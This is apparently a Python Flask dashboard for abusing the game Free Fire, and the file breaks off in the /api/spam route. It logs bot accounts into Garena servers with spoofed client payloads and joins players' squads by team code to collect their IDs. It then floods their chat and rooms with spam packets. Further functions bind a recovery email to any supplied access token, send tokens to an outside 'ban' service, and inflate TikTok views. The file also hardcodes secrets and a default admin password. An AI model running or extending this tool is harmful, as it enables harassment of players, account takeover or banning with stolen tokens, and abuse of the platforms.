# app.py - Fixed Version with AI Chat
import os
import sys
import json
import time
import socket
import threading
import queue
import requests
import jwt
import urllib3
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from functools import wraps
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from google.protobuf.timestamp_pb2 import Timestamp
import logging
import uuid
import re

# Try to import BeautifulSoup (optional, will work without it)
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    print("[WARN] BeautifulSoup4 not installed. AI chat may have limited functionality.", flush=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CHECK IMPORTS ====================
try:
    from masry import (
        EnC_AEs, EnC_PacKeT, DEc_PacKeT, DeCode_PackEt, DecodE_HeX,
        CrEaTe_ProTo, GeneRaTePk, xMsGFixinG, generate_random_color,
        JoinSq, ExitSq, OpenCh, MsqSq, GeTSQDaTa
    )
except ImportError as e:
    print(f"ERROR: Cannot import masry module: {e}")
    print("Make sure masry.py is in the same directory")
    sys.exit(1)

try:
    import Xr
except ImportError as e:
    print(f"ERROR: Cannot import Xr module: {e}")
    print("Make sure Xr.py is in the same directory")
    sys.exit(1)

# ==================== LOGGING SETUP ====================
_DEV_MODE = os.environ.get("DEV", "0") == "1"

if _DEV_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[logging.StreamHandler(sys.stdout)]
    )
    logging.getLogger("werkzeug").setLevel(logging.INFO)
    for _noisy in ("urllib3", "requests", "charset_normalizer"):
        logging.getLogger(_noisy).setLevel(logging.WARNING)
else:
    logging.getLogger("werkzeug").setLevel(logging.ERROR)
    for _noisy in ("urllib3", "requests", "charset_normalizer"):
        logging.getLogger(_noisy).setLevel(logging.CRITICAL)
    _stream_handler = logging.StreamHandler(sys.stdout)
    _stream_handler.setLevel(logging.ERROR)
    _stream_handler.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
    logging.basicConfig(level=logging.WARNING, handlers=[_stream_handler])

logger = logging.getLogger("FF_WEB")
logger.setLevel(logging.DEBUG if _DEV_MODE else logging.WARNING)

if _DEV_MODE:
    def dbg(msg): logger.debug(msg)
    def info(msg): logger.info(msg)
    def warn(msg): logger.warning(msg)
    def err(msg): logger.error(msg)
    print("[DEV MODE] Full logging enabled", flush=True)
else:
    def dbg(msg): pass
    def info(msg): pass
    def warn(msg): logger.warning(msg)
    def err(msg): logger.error(msg)

# ==================== FLASK CONFIG ====================
app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
app.config['JSON_AS_ASCII'] = False

# ==================== CẤU HÌNH ====================
freefire_version = "OB52"
client_secret = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"

connected_clients = {}
connected_clients_lock = threading.Lock()

# Admin configuration
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "admin123"

# ==================== PACKET HELPERS ====================
def _encVarint(n):
    if n < 0: return b''
    h = []
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            b |= 0x80
        h.append(b)
        if not n:
            break
    return bytes(h)

def _createVarint(field, value):
    return _encVarint((field << 3) | 0) + _encVarint(value)

def _createLength(field, value):
    hdr = _encVarint((field << 3) | 2)
    enc = value.encode() if isinstance(value, str) else value
    return hdr + _encVarint(len(enc)) + enc

def _createProto(fields):
    pkt = bytearray()
    for f, v in fields.items():
        if isinstance(v, dict):
            nested = _createProto(v)
            pkt.extend(_createLength(f, nested))
        elif isinstance(v, int):
            pkt.extend(_createVarint(f, v))
        elif isinstance(v, (str, bytes)):
            pkt.extend(_createLength(f, v))
    return pkt

def _decodeHex(h):
    r = hex(h)[2:]
    return "0" + r if len(r) == 1 else r

def _genPkt(pkt, n, k, iv):
    try:
        enc = EnC_PacKeT(pkt, k, iv)
        l = _decodeHex(len(enc) // 2)
        if len(l) == 2:
            hdr = n + "000000"
        elif len(l) == 3:
            hdr = n + "00000"
        elif len(l) == 4:
            hdr = n + "0000"
        elif len(l) == 5:
            hdr = n + "000"
        else:
            hdr = n + "000000"
        return bytes.fromhex(hdr + l + enc)
    except Exception as e:
        err(f"_genPkt error: {e}")
        return b''

def _openRoom(k, iv):
    try:
        f = {1: 2, 2: {1: 1, 2: 15, 3: 5, 4: "SENZU", 5: "1", 6: 12, 7: 1,
                        8: 1, 9: 1, 11: 1, 12: 2, 14: 36981056,
                        15: {1: "IDC3", 2: 126, 3: "VN"},
                        16: "\u0001\u0003\u0004\u0007\t\n\u000b\u0012\u000f\u000e\u0016\u0019\u001a \u001d",
                        18: 2368584, 27: 1, 34: "\u0000\u0001", 40: "en", 48: 1,
                        49: {1: 21}, 50: {1: 36981056, 2: 2368584, 5: 2}}}
        return _genPkt(str(_createProto(f).hex()), '0E15', k, iv)
    except Exception as e:
        err(f"_openRoom error: {e}")
        return b''

def _spmRoom(k, iv, uid):
    try:
        f = {1: 22, 2: {1: int(uid)}}
        return _genPkt(str(_createProto(f).hex()), '0E15', k, iv)
    except Exception as e:
        err(f"_spmRoom error: {e}")
        return b''

# ==================== RECOVERY/ACCOUNT FUNCTIONS ====================
DEFAULT_HEADERS = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    'Connection': "Keep-Alive",
    'Accept-Encoding': "gzip",
}

def convert_seconds(seconds):
    try:
        seconds = int(seconds)
        d, h = divmod(seconds, 86400)
        h, m = divmod(h, 3600)
        m, s = divmod(m, 60)
        parts = []
        if d: parts.append(f"{d} days")
        if h: parts.append(f"{h} hours")
        if m: parts.append(f"{m} minutes")
        parts.append(f"{s} seconds")
        return " ".join(parts)
    except:
        return "unknown"

def send_otp(email, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    payload = {'app_id': "100067", 'access_token': access_token, 'email': email, 'locale': "en_MA"}
    headers = {**DEFAULT_HEADERS, 'Accept': "application/json"}
    try:
        rsp = requests.post(url, data=payload, headers=headers, timeout=15, verify=False)
        if rsp.status_code == 200:
            data = rsp.json()
            if data.get("error_code") == 0:
                return {"success": True, "message": "OTP sent successfully"}
            return {"success": False, "error": data.get("error_msg", "Unknown error")}
        return {"success": False, "error": f"HTTP {rsp.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def verify_otp(otp, email, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    payload = {'app_id': "100067", 'access_token': access_token, 'otp': otp, 'email': email}
    try:
        rsp = requests.post(url, data=payload, headers=DEFAULT_HEADERS, timeout=15, verify=False)
        if rsp.status_code == 200:
            data = rsp.json()
            if data.get("error_code") == 0:
                return {"success": True, "verifier_token": data.get("verifier_token")}
            return {"success": False, "error": data.get("error_msg", "Invalid OTP")}
        return {"success": False, "error": f"HTTP {rsp.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def cancel_request(access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    payload = {'app_id': "100067", 'access_token': access_token}
    try:
        rsp = requests.post(url, data=payload, headers=DEFAULT_HEADERS, timeout=15, verify=False)
        if rsp.status_code == 200:
            data = rsp.json()
            if data.get("error_code") == 0:
                return {"success": True, "message": "Request cancelled"}
            return {"success": False, "error": data.get("error_msg", "Unknown error")}
        return {"success": False, "error": f"HTTP {rsp.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def create_bind_request(verifier_token, access_token, email):
    url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
    payload = {
        'app_id': "100067",
        'access_token': access_token,
        'verifier_token': verifier_token,
        'secondary_password': "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203",
        'email': email
    }
    try:
        rsp = requests.post(url, data=payload, headers=DEFAULT_HEADERS, timeout=15, verify=False)
        if rsp.status_code == 200:
            data = rsp.json()
            if data.get("error_code") == 0:
                return {"success": True, "message": f"Email {email} added successfully"}
            return {"success": False, "error": data.get("error_msg", "Unknown error")}
        return {"success": False, "error": f"HTTP {rsp.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def get_bind_info(access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    payload = {'app_id': "100067", 'access_token': access_token}
    try:
        rsp = requests.get(url, params=payload, headers=DEFAULT_HEADERS, timeout=15, verify=False)
        if rsp.status_code == 200:
            data = rsp.json()
            if data.get("error_code") == 0:
                email = data.get("email", "")
                email_to_be = data.get("email_to_be", "")
                countdown = data.get("request_exec_countdown", 0)
                if email == "" and email_to_be == "":
                    status = "No recovery email set"
                elif email != "" and email_to_be == "":
                    status = f"Linked: {email}"
                elif email == "" and email_to_be != "":
                    status = f"Pending: {email_to_be} (confirm in {convert_seconds(countdown)})"
                else:
                    status = f"Current: {email} → Changing to: {email_to_be}"
                return {"success": True, "status": status}
            return {"success": False, "error": data.get("error_msg", "Unknown error")}
        return {"success": False, "error": f"HTTP {rsp.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def get_linked_platforms(access_token):
    url = "https://100067.connect.garena.com/bind/app/platform/info/get"
    platform_map = {3: "Facebook", 8: "Gmail", 10: "iCloud", 5: "VK", 11: "Twitter", 7: "Huawei"}
    try:
        rsp = requests.get(url, params={'access_token': access_token}, headers=DEFAULT_HEADERS, timeout=15, verify=False)
        if rsp.status_code in [200, 201]:
            data = rsp.json()
            if data.get("error_code") == 0:
                bounded = data.get("bounded_accounts", [])
                available = data.get("available_platforms", [])
                platforms = []
                for x in bounded:
                    p = x.get('platform')
                    uinfo = x.get('user_info', {})
                    platforms.append({
                        "platform": platform_map.get(p, f"Platform {p}"),
                        "email": uinfo.get('email', ''),
                        "nickname": uinfo.get('nickname', '')
                    })
                main_platform = None
                for pid, pname in platform_map.items():
                    if pid not in available:
                        main_platform = pname
                        break
                return {"success": True, "platforms": platforms, "main_platform": main_platform}
            return {"success": False, "error": data.get("error_msg", "Unknown error")}
        return {"success": False, "error": f"HTTP {rsp.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def ban_account(access_token):
    url = "https://bannaccess.vercel.app/ban"
    try:
        rsp = requests.get(url, params={'access': access_token}, headers=DEFAULT_HEADERS, timeout=15, verify=False)
        if rsp.status_code == 200:
            data = rsp.json()
            if data.get("success"):
                return {"success": True, "account_id": data.get("account_id", "N/A")}
            return {"success": False, "error": "API returned false"}
        return {"success": False, "error": f"HTTP {rsp.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ==================== CLASS xCLF ====================
class xCLF:
    def __init__(self, id, password):
        self.id = id
        self.password = password
        self.CliEnts = None
        self.CliEnts2 = None
        self.key = None
        self.iv = None
        self.max_retries = 3
        self.retry_count = 0
        self._squad_queue = queue.Queue()
        self._squad_active = False
        self._sock2_started = False
        self.status = "initializing"
        self.status_message = ""
        self._running = True

        with connected_clients_lock:
            connected_clients[self.id] = self

        info(f"[xCLF] Initialized account {self.id}")
        threading.Thread(target=self.GeNToKeNLogin, daemon=True).start()

    def update_status(self, status, message=""):
        self.status = status
        self.status_message = message
        info(f"[STATUS:{self.id}] {status} - {message}")

    def GeTinFoSqMsG(self, teamcode):
        try:
            if not self.key or not self.iv:
                return {"success": False, "reason": "Key/IV not ready"}
            if not (hasattr(self, 'CliEnts2') and self.CliEnts2):
                return {"success": False, "reason": "Socket2 not connected"}

            while not self._squad_queue.empty():
                try:
                    self._squad_queue.get_nowait()
                except:
                    pass
            self._squad_active = True

            try:
                pkt = JoinSq(teamcode, self.key, self.iv)
                self.CliEnts2.send(pkt)
            except Exception as e:
                self._squad_active = False
                return {"success": False, "reason": f"Send failed: {e}"}

            buf = b""
            buf_offset = 0
            start = time.time()

            while time.time() - start < 25 and self._running:
                try:
                    chunk = self._squad_queue.get(timeout=0.5)
                    if chunk == b"":
                        buf = b""
                        buf_offset = 0
                        time.sleep(0.5)
                        try:
                            self.CliEnts2.send(JoinSq(teamcode, self.key, self.iv))
                        except:
                            pass
                        continue
                    buf += chunk

                    i = buf_offset
                    while i + 5 <= len(buf):
                        try:
                            pkt_len = int(buf[i+2:i+5].hex(), 16)
                            pkt_end = i + 5 + pkt_len
                            if pkt_end > len(buf):
                                break
                            pkt_body = buf[i+5:pkt_end]
                            i = pkt_end

                            dT = None
                            raw_hex = pkt_body.hex()

                            try:
                                decoded = DeCode_PackEt(raw_hex)
                                if decoded:
                                    dT = json.loads(decoded)
                            except:
                                pass

                            if not dT:
                                try:
                                    dec_hex = DEc_PacKeT(raw_hex, self.key, self.iv)
                                    decoded = DeCode_PackEt(dec_hex)
                                    if decoded:
                                        dT = json.loads(decoded)
                                except:
                                    pass

                            if not dT:
                                continue

                            OwNer, SQuAD, ChaT = GeTSQDaTa(dT)
                            if OwNer and ChaT and SQuAD:
                                try:
                                    self.CliEnts2.send(ExitSq('000000', self.key, self.iv))
                                except:
                                    pass
                                self._squad_active = False
                                return {"success": True, "OwNer_UiD": OwNer,
                                        "SQuAD_CoDe": SQuAD, "ChaT_CoDe": ChaT}
                        except Exception:
                            i += 1
                            continue
                    buf_offset = i
                except queue.Empty:
                    continue
                except Exception:
                    break

            self._squad_active = False
            return {"success": False, "reason": "Timeout - no data received"}
        except Exception as e:
            self._squad_active = False
            return {"success": False, "reason": str(e)}

    def _chat_worker(self, client, owner_uid, chat_code, message, count, progress_callback=None):
        for _ in range(20):
            if client.CliEnts is not None:
                break
            time.sleep(0.5)
        if client.CliEnts is None:
            return
        try:
            uid_int = int(owner_uid)
            chat_str = str(chat_code)
            client.CliEnts.send(OpenCh(uid_int, chat_str, client.key, client.iv))
            time.sleep(1)
            for i in range(count):
                if client.CliEnts is None:
                    break
                client.CliEnts.send(MsqSq(f'[b][c]{generate_random_color()}{message}', uid_int, client.key, client.iv))
                if progress_callback:
                    progress_callback(i + 1, count, "chat")
                time.sleep(0.5)
        except Exception as e:
            err(f"[CHAT:{client.id}] Error: {e}")

    def _room_worker(self, client, owner_uid, count, progress_callback=None):
        for _ in range(20):
            if client.CliEnts2 is not None:
                break
            time.sleep(0.5)
        if client.CliEnts2 is None:
            return
        try:
            uid_int = int(owner_uid)
            k = client.key if isinstance(client.key, bytes) else bytes.fromhex(client.key)
            iv = client.iv if isinstance(client.iv, bytes) else bytes.fromhex(client.iv)
            room_pkt = _openRoom(k, iv)
            spm_pkt = _spmRoom(k, iv, uid_int)
            client.CliEnts2.send(room_pkt)
            time.sleep(0.3)
            for i in range(count):
                if client.CliEnts2 is None:
                    break
                client.CliEnts2.send(spm_pkt)
                if progress_callback:
                    progress_callback(i + 1, count, "room")
                time.sleep(0.05)
        except Exception as e:
            err(f"[ROOM:{client.id}] Error: {e}")

    def SeNd_SpaM_MsG(self, owner_uid, chat_code, message, count=50, progress_callback=None):
        try:
            with connected_clients_lock:
                clients = [c for c in list(connected_clients.values())[:3] if c.key and c.iv]
            if not clients:
                return False
            threads = []
            for c in clients:
                t1 = threading.Thread(target=self._chat_worker, args=(c, owner_uid, chat_code, message, count, progress_callback), daemon=True)
                t2 = threading.Thread(target=self._room_worker, args=(c, owner_uid, count, progress_callback), daemon=True)
                threads.append(t1)
                threads.append(t2)
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=60)
            return True
        except Exception as e:
            err(f"[SPAM] Error: {e}")
            return False

    def ConnEcT_SerVer_OnLiNe(self, Token, tok, host, port, key, iv, host2, port2):
        self.key = key
        self.iv = iv
        while True:
            try:
                new_sock = socket.create_connection((host2, int(port2)), timeout=15)
                new_sock.send(bytes.fromhex(tok))
                self.CliEnts2 = new_sock
                self.update_status("connected", "Socket2 connected")
                while True:
                    try:
                        self.CliEnts2.settimeout(1.0)
                        data = self.CliEnts2.recv(99999)
                        if not data:
                            break
                        if self._squad_active:
                            self._squad_queue.put(data)
                    except socket.timeout:
                        continue
                    except Exception:
                        break
            except Exception as e:
                err(f"[SOCK2:{self.id}] Connection failed: {e}")
                if self._squad_active:
                    self._squad_queue.put(b"")
                time.sleep(2)

    def ConnEcT_SerVer(self, Token, tok, host, port, key, iv, host2, port2):
        self.key = key
        self.iv = iv

        while True:
            try:
                self.CliEnts = socket.create_connection((host, int(port)), timeout=15)
                self.CliEnts.send(bytes.fromhex(tok))
                self.CliEnts.recv(1024)
                self.update_status("connected", "Socket1 connected")
                break
            except Exception as e:
                err(f"[SOCK1:{self.id}] Connect failed: {e}")
                try:
                    self.CliEnts.close()
                except:
                    pass
                self.CliEnts = None
                time.sleep(3)

        if not hasattr(self, '_sock2_started') or not self._sock2_started:
            self._sock2_started = True
            threading.Thread(target=self.ConnEcT_SerVer_OnLiNe, args=(Token, tok, host, port, key, iv, host2, port2), daemon=True).start()

        while True:
            try:
                self.CliEnts.settimeout(30)
                data = self.CliEnts.recv(1024)
                if len(data) == 0:
                    try:
                        self.CliEnts.close()
                    except:
                        pass
                    self.CliEnts = None
                    self.update_status("connecting", "Socket1 disconnected")
                    time.sleep(2)
                    while True:
                        try:
                            self.CliEnts = socket.create_connection((host, int(port)), timeout=15)
                            self.CliEnts.send(bytes.fromhex(tok))
                            self.CliEnts.recv(1024)
                            self.update_status("connected", "Socket1 reconnected")
                            self.retry_count = 0
                            break
                        except Exception:
                            time.sleep(3)
                else:
                    self.retry_count = 0
            except socket.timeout:
                continue
            except Exception:
                self.retry_count += 1
                if self.retry_count >= self.max_retries:
                    self.update_status("error", "Max retries reached")
                    return
                time.sleep(3)

    def GeT_Key_Iv(self, serialized_data):
        try:
            msg = Xr.MyMessage()
            msg.ParseFromString(serialized_data)
            ts_obj = Timestamp()
            ts_obj.FromNanoseconds(msg.field21)
            combined_ts = ts_obj.seconds * 1_000_000_000 + ts_obj.nanos
            return combined_ts, msg.field22, msg.field23
        except Exception as e:
            err(f"[LOGIN:{self.id}] GeT_Key_Iv error: {e}")
            return None, None, None

    def GuestLogin(self, uid, password):
        self.update_status("logging", "Guest login...")
        try:
            resp = requests.post(
                "https://100067.connect.garena.com/oauth/guest/token/grant",
                headers={
                    "Host": "100067.connect.garena.com",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close",
                },
                data={"uid": uid, "password": password, "response_type": "token",
                      "client_type": "2", "client_secret": client_secret, "client_id": "100067"},
                timeout=30,
                verify=False
            )
            if resp.status_code != 200:
                self.update_status("error", f"Guest login HTTP {resp.status_code}")
                return None
            data = resp.json()
            if 'access_token' not in data:
                self.update_status("error", "Guest login failed: no access_token")
                return None
            self.Access_ToKen = data['access_token']
            self.Access_Uid = data['open_id']
            info(f"[LOGIN:{uid}] GuestLogin OK")
            time.sleep(0.5)
            return self.MajorLogin(self.Access_ToKen, self.Access_Uid)
        except Exception as e:
            self.update_status("error", f"Guest login failed: {e}")
            return None

    def DataLogin(self, JwT_ToKen, PayLoad):
        try:
            resp = requests.post(
                'https://clientbp.ggpolarbear.com/GetLoginData',
                headers={
                    'Authorization': f'Bearer {JwT_ToKen}',
                    'X-Unity-Version': '2022.3.47f1',
                    'ReleaseVersion': freefire_version,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
                },
                data=PayLoad,
                timeout=30,
                verify=False
            )
            if resp.status_code != 200:
                return None, None, None, None
            decoded = DeCode_PackEt(resp.content.hex())
            if not decoded:
                return None, None, None, None
            d = json.loads(decoded)
            if '32' not in d or '14' not in d:
                return None, None, None, None
            addr = d['32']['data']
            addr2 = d['14']['data']
            ip = addr[:len(addr)-6]
            port = addr[len(addr)-5:]
            ip2 = addr2[:len(addr2)-6]
            port2 = addr2[len(addr2)-5:]
            return ip, port, ip2, port2
        except Exception as e:
            err(f"[LOGIN:{self.id}] DataLogin error: {e}")
            return None, None, None, None

    def MajorLogin(self, Access_ToKen, Access_Uid):
        self.update_status("logging", "Major login...")
        dT = b'\x1a\x132026-01-14 12:19:02"\tfree fire(\x01:\x071.120.1B2Android OS 9 / API-28 (PI/rel.cjw.20220518.114133)J\x08HandheldR\x0cMTN/SpacetelZ\x04WIFI`\x80\nh\xd0\x05r\x03240z-x86-64 SSE3 SSE4.1 SSE4.2 AVX AVX2 | 2400 | 4\x80\x01\xe6\x1e\x8a\x01\x0fAdreno (TM) 640\x92\x01\rOpenGL ES 3.2\x9a\x01+Google|625f716f-91a7-495b-9f16-08fe9d3c6533\xa2\x01\r176.28.145.29\xaa\x01\x02ar\xb2\x01 9132c6fb72caccfdc8120d9ec2cc06b8\xba\x01\x014\xc2\x01\x08Handheld\xca\x01\rOnePlus A5010\xd2\x01\x02SG\xea\x01@3dfa9ab9d25270faf432f7b528564be9ec4790bc744a4eba70225207427d0c40\xf0\x01\x01\xca\x02\x0cMTN/Spacetel\xd2\x02\x04WIFI\xca\x03 1ac4b80ecf0478a44203bf8fac6120f5\xe0\x03\xb5\xee\x02\xe8\x03\xc2\x83\x02\xf0\x03\xaf\x13\xf8\x03\x84\x07\x80\x04\xcf\x92\x02\x88\x04\xb5\xee\x02\x90\x04\xcf\x92\x02\x98\x04\xb5\xee\x02\xb0\x04\x04\xc8\x04\x03\xd2\x04=/data/app/com.dts.freefireth-I1hUq4t4vA6_Qo4C-XgaeQ==/lib/arm\xe0\x04\x01\xea\x04_e62ab9354d8fb5fb081db338acb33491|/data/app/com.dts.freefireth-I1hUq4t4vA6_Qo4C-XgaeQ==/base.apk\xf0\x04\x06\xf8\x04\x01\x8a\x05\x0232\x9a\x05\n2019119624\xb2\x05\tOpenGLES2\xb8\x05\xff\x01\xc0\x05\x04\xe0\x05\xed\xb4\x02\xea\x05\t3rd_party\xf2\x05\\KqsHT8Q+ls0+DdIl/OavRrovpyZYcwgnQHQQcmWwjGmXvBQKOMctxpyopTQWTHvS5JqMigGkSLCLB6Q8x9TAavMfljo=\x88\x06\x01\x90\x06\x01\x9a\x06\x014\xa2\x06\x014\xb2\x06"@\x06GOVT\n\x01\x1a]\x0e\x11^\x00\x17\rKn\x08W\tQ\nhZ\x02Xh\x00\to\x00\x01a'
        current_time = str(datetime.now())[:-7].encode()
        dT = dT.replace(b'2026-01-14 12:19:02', current_time)
        dT = dT.replace(b'9132c6fb72caccfdc8120d9ec2cc06b8', Access_Uid.encode())
        dT = dT.replace(b'3dfa9ab9d25270faf432f7b528564be9ec4790bc744a4eba70225207427d0c40', Access_ToKen.encode())
        try:
            self.PaYload = bytes.fromhex(EnC_AEs(dT.hex()))
        except Exception as e:
            self.update_status("error", f"Encryption failed: {e}")
            return None

        try:
            resp = requests.post(
                "https://loginbp.ggpolarbear.com/MajorLogin",
                headers={
                    'X-Unity-Version': '2022.3.47f1',
                    'ReleaseVersion': freefire_version,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-GA': 'v1 1',
                    'Content-Length': str(len(self.PaYload)),
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
                },
                data=self.PaYload,
                timeout=30,
                verify=False
            )
            if resp.status_code != 200 or len(resp.text) < 10:
                self.update_status("error", f"Major login failed: HTTP {resp.status_code}")
                return None

            decoded = DeCode_PackEt(resp.content.hex())
            if not decoded:
                self.update_status("error", "Failed to decode response")
                return None
            d = json.loads(decoded)
            if '8' not in d or 'data' not in d['8']:
                self.update_status("error", "Invalid response format")
                return None
            self.JwT_ToKen = d['8']['data']
            combined_ts, self.key, self.iv = self.GeT_Key_Iv(resp.content)
            if not self.key:
                self.update_status("error", "Failed to get key/iv")
                return None

            ip, port, ip2, port2 = self.DataLogin(self.JwT_ToKen, self.PaYload)
            if not ip:
                self.update_status("error", "DataLogin failed")
                return None

            self.update_status("connected", "Login successful")
            return self.JwT_ToKen, self.key, self.iv, combined_ts, ip, port, ip2, port2
        except Exception as e:
            self.update_status("error", f"Major login exception: {e}")
            return None

    def GeNToKeNLogin(self):
        self.update_status("logging", "Starting login...")
        try:
            result = self.GuestLogin(self.id, self.password)
            if not result:
                self.update_status("error", "Login failed")
                return
            token, key, iv, Ts, ip, port, ip2, port2 = result
            self.JwT_ToKen = token
            dec = jwt.decode(token, options={"verify_signature": False})
            encoded_acc = hex(dec['account_id'])[2:]
            time_hex = DecodE_HeX(Ts)
            jwt_hex = token.encode().hex()
            enc_packet = EnC_PacKeT(jwt_hex, key, iv)
            head_len = hex(len(enc_packet) // 2)[2:]
            zeros = {7: '000000000', 8: '00000000', 9: '0000000', 10: '000000'}.get(len(encoded_acc), '00000000')
            final_token = f'0115{zeros}{encoded_acc}{time_hex}00000{head_len}' + enc_packet
            self.update_status("connected", f"Connected to {ip}:{port}")
            self.ConnEcT_SerVer(token, final_token, ip, port, key, iv, ip2, port2)
        except Exception as e:
            self.update_status("error", f"Login error: {e}")

# ==================== GEMINI AI (Simplified, no BeautifulSoup required) ====================
def chat_with_gemini(prompt):
    """Simple Gemini chat using direct requests"""
    try:
        # Using a free Gemini API endpoint (you can replace with your own)
        url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"
        
        # Note: You need an API key for this to work
        # For demo, return a simulated response
        # To enable real Gemini, set GEMINI_API_KEY environment variable
        api_key = os.environ.get("GEMINI_API_KEY", "")
        
        if api_key:
            headers = {"Content-Type": "application/json"}
            payload = {
                "contents": [{"parts": [{"text": prompt}]}],
                "generationConfig": {"temperature": 0.7, "maxOutputTokens": 800}
            }
            resp = requests.post(f"{url}?key={api_key}", json=payload, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if "candidates" in data and len(data["candidates"]) > 0:
                    text = data["candidates"][0]["content"]["parts"][0]["text"]
                    return {"success": True, "response": text, "metadata": {"model": "gemini-pro"}}
            return {"success": False, "error": f"API error: {resp.status_code}"}
        else:
            # Simulated response when no API key
            return {
                "success": True,
                "response": f"🤖 *Gemini AI Demo Mode*\n\nBạn hỏi: {prompt[:100]}...\n\nĐể sử dụng Gemini thật, hãy đặt biến môi trường GEMINI_API_KEY.\n\nBạn có thể lấy API key tại: https://aistudio.google.com/apikey",
                "metadata": {"model": "demo", "response_time": "0.5s"}
            }
    except Exception as e:
        return {"success": False, "error": str(e)}

# ==================== TIKTOK BUFF VIEWS ====================
_TIKTOK_API_URL = 'https://leofame.com/ar/free-tiktok-views'

def tiktok_buff_views(link):
    try:
        sess = requests.Session()
        resp = sess.get(_TIKTOK_API_URL, headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}, timeout=15)
        cookies = sess.cookies.get_dict()
        
        token = None
        if 'name="token" value="' in resp.text:
            token = resp.text.split('name="token" value="')[1].split('"')[0]
        
        if not token:
            return {'success': False, 'error': 'Không lấy được token'}
        
        t0 = time.time()
        resp2 = requests.post(
            _TIKTOK_API_URL,
            params={'api': '1'},
            cookies=cookies,
            headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'},
            data={'token': token, 'timezone_offset': 'Asia/Ho_Chi_Minh', 'free_link': link},
            timeout=25
        )
        elapsed = round(time.time() - t0, 2)
        
        if 'يرجى الانتظار' in resp2.text:
            return {'success': False, 'error': 'Rate limit: vui lòng chờ 24 giờ', 'elapsed': elapsed}
        
        return {'success': True, 'elapsed': elapsed, 'response': resp2.text[:500]}
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ==================== SPAM ACCOUNTS ====================
SPAM_ACCOUNTS = [
    {'id': '4691534392', 'password': 'Senzu_999AA76C'},
]

def start_spam_server():
    time.sleep(2)
    info(f"[SERVER] Starting {len(SPAM_ACCOUNTS)} spam accounts")
    for acc in SPAM_ACCOUNTS:
        try:
            xCLF(acc['id'], acc['password'])
        except Exception as e:
            err(f"Failed to start account {acc['id']}: {e}")
        time.sleep(5)

# ==================== WEB AUTH DECORATOR ====================
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session or not session['logged_in']:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    if 'logged_in' in session and session['logged_in']:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['logged_in'] = True
            session.permanent = True
            return redirect(url_for('dashboard'))
        return render_template('login.html', error="Invalid credentials")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

# ==================== SPAM API ====================
@app.route('/api/status')
@login_required
def api_status():
    with connected_clients_lock:
        clients_status = {}
        for uid, client in connected_clients.items():
            clients_status[uid] = {'status': client.status, 'message': client.status_message, 'id': client.id}
    return jsonify({'total_clients': len(connected_clients), 'clients': clients_status, 'spam_accounts': SPAM_ACCOUNTS})

@app.route('/api/get_squad', methods=['POST'])
@login_required
def api_get_squad():
    data = request.get_json()
    if not data or not data.get('teamcode'):
        return jsonify({'success': False, 'error': 'Teamcode is required'})
    
    with connected_clients_lock:
        if not connected_clients:
            return jsonify({'success': False, 'error': 'No connected clients'})
        first_client = list(connected_clients.values())[0]
    
    result = first_client.GeTinFoSqMsG(str(data['teamcode']))
    if result.get('success'):
        session['squad_cache'] = {
            'teamcode': str(data['teamcode']),
            'OwNer_UiD': result['OwNer_UiD'],
            'ChaT_CoDe': result['ChaT_CoDe']
        }
    return jsonify(result)

@app.route('/api/spam', methods=['POST'])
@login_required
def api_spam():
